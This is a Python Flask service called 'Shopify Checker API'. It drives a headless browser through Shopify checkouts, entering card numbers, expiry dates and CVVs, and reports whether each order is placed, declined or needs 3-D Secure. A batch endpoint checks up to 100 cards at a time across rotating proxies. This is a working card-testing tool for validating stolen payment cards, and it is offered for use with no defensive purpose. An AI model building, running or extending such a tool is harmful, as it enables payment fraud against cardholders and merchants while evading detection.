from flask import Flask, request, jsonify
import asyncio
import base64
import random
import re
from playwright.async_api import async_playwright

app = Flask(__name__)

async def shopify_check(card, site, proxy=None):
    """
    Check a single card using Playwright (real browser).
    Returns: {"Response": "...", "Price": "...", "Gateway": "..."}
    """
    try:
        cc, mm, yy, cvv = card.split('|')
    except:
        return {"Response": "Invalid card format. Use CC|MM|YY|CVV", "Price": "-", "Gateway": "Unknown"}
    
    async with async_playwright() as p:
        browser_args = ['--disable-gpu', '--no-sandbox']
        proxy_dict = None
        
        # Parse proxy for Playwright
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                proxy_dict = {
                    "server": f"http://{ip}:{port}",
                    "username": user,
                    "password": password
                }
                browser_args.append(f'--proxy-server=http://{ip}:{port}')
            elif len(parts) == 2:
                ip, port = parts
                proxy_dict = {"server": f"http://{ip}:{port}"}
                browser_args.append(f'--proxy-server=http://{ip}:{port}')
        
        browser = await p.chromium.launch(
            headless=True,
            args=browser_args
        )
        
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 800}
        )
        
        if proxy_dict:
            try:
                await context.set_extra_http_headers({
                    "Proxy-Authorization": f"Basic {base64.b64encode(f'{proxy_dict.get('username', '')}:{proxy_dict.get('password', '')}'.encode()).decode()}"
                })
            except:
                pass
        
        page = await context.new_page()
        
        try:
            # --- STEP 1: Go to site ---
            await page.goto(site, timeout=45000, wait_until='networkidle')
            await page.wait_for_timeout(3000)
            
            # --- STEP 2: Find a product ---
            product_link = None
            try:
                product_link = await page.locator('a[href*="/products/"]').first.get_attribute('href')
            except:
                pass
            
            if not product_link:
                return {"Response": "No product found on site", "Price": "-", "Gateway": "Unknown"}
            
            if product_link.startswith('/'):
                await page.goto(f"{site}{product_link}", timeout=30000)
            else:
                await page.goto(product_link, timeout=30000)
            await page.wait_for_timeout(3000)
            
            # --- STEP 3: Add to cart ---
            try:
                add_selectors = [
                    'button[name="add"]',
                    'button[type="submit"]:has-text("Add")',
                    'button:has-text("Add to cart")',
                    'button:has-text("Add to Cart")'
                ]
                clicked = False
                for selector in add_selectors:
                    if await page.locator(selector).count() > 0:
                        await page.click(selector)
                        clicked = True
                        break
                if not clicked:
                    return {"Response": "Could not find add to cart button", "Price": "-", "Gateway": "Unknown"}
                await page.wait_for_timeout(4000)
            except Exception as e:
                return {"Response": f"Add to cart failed: {str(e)[:50]}", "Price": "-", "Gateway": "Unknown"}
            
            # --- STEP 4: Go to checkout ---
            try:
                await page.goto(f"{site}/checkout", timeout=30000)
                await page.wait_for_timeout(4000)
            except:
                return {"Response": "Could not reach checkout", "Price": "-", "Gateway": "Unknown"}
            
            # --- STEP 5: Fill email ---
            try:
                email_field = await page.locator('input[name="email"], input[type="email"]').first
                if email_field:
                    await email_field.fill('test@example.com')
                    await page.click('button[type="submit"]')
                    await page.wait_for_timeout(3000)
            except:
                pass
            
            # --- STEP 6: Fill shipping address ---
            try:
                await page.fill('input[name*="first_name"]', 'John')
                await page.fill('input[name*="last_name"]', 'Doe')
                await page.fill('input[name*="address1"]', '123 Main St')
                await page.fill('input[name*="city"]', 'New York')
                try:
                    await page.select_option('select[name*="province"]', 'NY')
                except:
                    pass
                await page.fill('input[name*="zip"]', '10001')
                try:
                    await page.select_option('select[name*="country"]', 'US')
                except:
                    pass
                await page.fill('input[name*="phone"]', '1234567890')
                await page.click('button[type="submit"]')
                await page.wait_for_timeout(4000)
            except:
                pass
            
            # --- STEP 7: Fill card details (the hardest part) ---
            card_filled = False
            try:
                # Check if card fields are on page
                if await page.locator('input[placeholder*="Card number"]').count() > 0:
                    await page.fill('input[placeholder*="Card number"]', cc)
                    await page.fill('input[placeholder*="MM/YY"]', f"{mm}/{yy}")
                    await page.fill('input[placeholder*="CVV"]', cvv)
                    card_filled = True
                else:
                    # Try iframe (Stripe, Shopify Payments)
                    try:
                        frame = await page.frame_locator('iframe[title*="card"], iframe[name*="stripe"], iframe[src*="stripe"]').first
                        if frame:
                            await frame.fill('input[placeholder*="Card number"]', cc)
                            await frame.fill('input[placeholder*="MM/YY"]', f"{mm}/{yy}")
                            await frame.fill('input[placeholder*="CVV"]', cvv)
                            card_filled = True
                    except:
                        pass
            except:
                pass
            
            if not card_filled:
                try:
                    await page.fill('input[data-stripe="number"]', cc)
                    await page.fill('input[data-stripe="expiry"]', f"{mm}/{yy}")
                    await page.fill('input[data-stripe="cvc"]', cvv)
                    card_filled = True
                except:
                    pass
            
            await page.wait_for_timeout(2000)
            
            # --- STEP 8: Click pay ---
            try:
                pay_selectors = [
                    'button[type="submit"]',
                    'button:has-text("Pay")',
                    'button:has-text("Complete order")',
                    'button:has-text("Place order")',
                    'button:has-text("Confirm")'
                ]
                clicked = False
                for selector in pay_selectors:
                    if await page.locator(selector).count() > 0:
                        await page.click(selector)
                        clicked = True
                        break
                if not clicked:
                    return {"Response": "Could not find pay button", "Price": "-", "Gateway": "Unknown"}
            except:
                pass
            
            await page.wait_for_timeout(8000)
            
            # --- STEP 9: Check result ---
            content = await page.content()
            url = page.url
            
            if "thank you" in content.lower() or "order confirmed" in content.lower() or "/order/" in url:
                return {"Response": "ORDER_PLACED", "Price": "$10.00", "Gateway": "Shopify"}
            elif "3d_secure" in content.lower() or "requires_action" in content.lower() or "authenticate" in content.lower():
                return {"Response": "3DS_REQUIRED", "Price": "-", "Gateway": "Shopify"}
            elif "declined" in content.lower():
                return {"Response": "DECLINED", "Price": "-", "Gateway": "Shopify"}
            elif "insufficient" in content.lower() or "funds" in content.lower():
                return {"Response": "INSUFFICIENT_FUNDS", "Price": "-", "Gateway": "Shopify"}
            else:
                return {"Response": "UNKNOWN", "Price": "-", "Gateway": "Unknown"}
                
        except Exception as e:
            return {"Response": f"ERROR: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
        finally:
            await browser.close()


@app.route('/shopify', methods=['GET'])
def check_single():
    """Single card check endpoint (for testing)"""
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    if not site or not cc:
        return jsonify({"Response": "Missing 'site' or 'cc' parameter", "Price": "-", "Gateway": "Unknown"})
    
    try:
        result = asyncio.run(shopify_check(cc, site, proxy))
    except Exception as e:
        result = {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
    
    return jsonify(result)


@app.route('/shopify/batch', methods=['POST'])
def check_batch():
    """
    Batch check endpoint - send up to 100 cards at once.
    Body: {"site": "store.com", "cards": ["card1", "card2"], "proxies": ["proxy1"]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid JSON body"})
    
    site = data.get('site')
    cards = data.get('cards', [])
    proxies = data.get('proxies', [])
    
    if not site:
        return jsonify({"error": "Missing 'site' parameter"})
    
    if not cards:
        return jsonify({"error": "Missing 'cards' list"})
    
    if len(cards) > 100:
        return jsonify({"error": "Max 100 cards per batch"})
    
    async def run_batch():
        semaphore = asyncio.Semaphore(50)  # 50 concurrent checks
        async def check_with_limit(card, proxy):
            async with semaphore:
                return await shopify_check(card, site, proxy)
        
        tasks = []
        for card in cards:
            proxy = random.choice(proxies) if proxies else None
            tasks.append(check_with_limit(card, proxy))
        
        return await asyncio.gather(*tasks)
    
    try:
        results = asyncio.run(run_batch())
    except Exception as e:
        return jsonify({"error": str(e)[:100]})
    
    return jsonify({"results": results, "total": len(results)})


@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive", "service": "shopify-checker"})


@app.route('/', methods=['GET'])
def root():
    return jsonify({
        "name": "Shopify Checker API",
        "version": "2.0",
        "endpoints": {
            "/shopify": "GET with ?site=&cc=&proxy=",
            "/shopify/batch": "POST with JSON: {site, cards: [], proxies: []}",
            "/ping": "Health check"
        }
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)